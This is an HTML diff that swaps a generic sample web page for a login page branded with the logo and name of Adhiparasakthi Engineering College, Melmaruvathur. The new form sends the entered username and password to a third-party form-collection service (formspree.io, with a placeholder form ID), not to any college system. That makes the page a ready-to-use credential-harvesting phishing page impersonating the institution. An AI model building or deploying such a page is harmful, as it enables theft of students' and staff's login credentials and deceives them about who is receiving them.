@@ -3,83 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sample Web Page</title>
-    <style>
-        /* Basic styling to make the sample look good */
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f9;
-            color: #333;
-        }
-        header {
-            background-color: #2c3e50;
-            color: #fff;
-            text-align: center;
-            padding: 2rem;
-        }
-        main {
-            max-width: 800px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-        .card {
-            background: #fff;
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        button {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1rem;
-        }
-        button:hover {
-            background-color: #2980b9;
-        }
-        footer {
-            text-align: center;
-            padding: 1rem;
-            background-color: #2c3e50;
-            color: white;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-    </style>
+    <title>APEC Login</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <header>
-        <h1>Welcome to My Sample Website</h1>
-        <p>A simple, clean HTML5 starter template</p>
-    </header>
+<div class="login-box">
 
-    <main>
-        <div class="card">
-            <h2>About This Page</h2>
-            <p>This is a foundational HTML document. It contains the essential structure needed to build any website, including a head section for metadata and a body section for visual content.</p>
-            
-            <h3>Key Features Included:</h3>
-            <ul>
-                <li>Responsive layout for mobile and desktop views</li>
-                <li>Clean typography and modern color palette</li>
-                <li>Interactive button element</li>
-            </ul>
+    <center>
+        <img src="images/apec-logo.png" alt="APEC Logo" width="150">
 
-            <button onclick="alert('Hello! Thanks for clicking.')">Click Me</button>
-        </div>
-    </main>
+        <h2>Adhiparasakthi Engineering College</h2>
+        <h3>Melmaruvathur</h3>
 
-    <footer>
-        <p>&copy; 2026 Sample Web Page. All rights reserved.</p>
-    </footer>
+        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+
+            <input type="text" name="username" placeholder="Username" required><br><br>
+
+            <input type="password" name="password" placeholder="Password" required><br><br>
+
+            <button type="submit">Login</button>
+
+        </form>
+
+    </center>
+
+</div>
 
 </body>
 </html>
